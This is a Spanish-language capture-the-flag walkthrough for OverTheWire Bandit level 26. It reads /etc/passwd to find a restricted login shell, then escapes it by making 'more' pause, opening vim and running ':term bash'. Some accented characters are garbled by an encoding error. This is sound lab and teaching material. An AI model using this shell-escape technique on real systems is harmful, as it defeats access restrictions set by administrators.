#Se crea una conexion base
ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit25/bandit26.sshkey

#Se busca dentro de passwd, para ver que tipo de shell se usa
cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

#Se ven los permisos de showtext, para ver si es editable
ll /usr/bin | grep showtext
-rwxr-xr-x  1 root     root           58 Dec  3 08:14 showtext*

#El contenido de showtext es el siguiente
cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0

#Una forma de obtener acceso al usuario bandit26 es aprovechar la ejecuci칩n
#del script, a traves del comando "more", ya que desde dentro se puede
#acceder al editor de vim, el cual permite la ejecucion de comandos.

#Para acceder a la visualizaci칩n de "more" es necesario hacer la 
#ventana lo suficientemente peque침a para que el texto de "showtext" se 
#detenga a mitad. Tras esto, se accede a vim mediante la tecla "v".

#Para obtener una shell, se pulsa ":" y se pasa el siguiente comando a 
#ejecutar:
:term bash
#Con esto se obtiene una consola interactiva. Para redimensionarla:
echo -e "\e[8;30;60t"

o

stty rows 30 cols 107

# Tambien se puede saber el tama침o de una ventana mediante:
stty size

#Con esto, ya tenemos una shell funcional
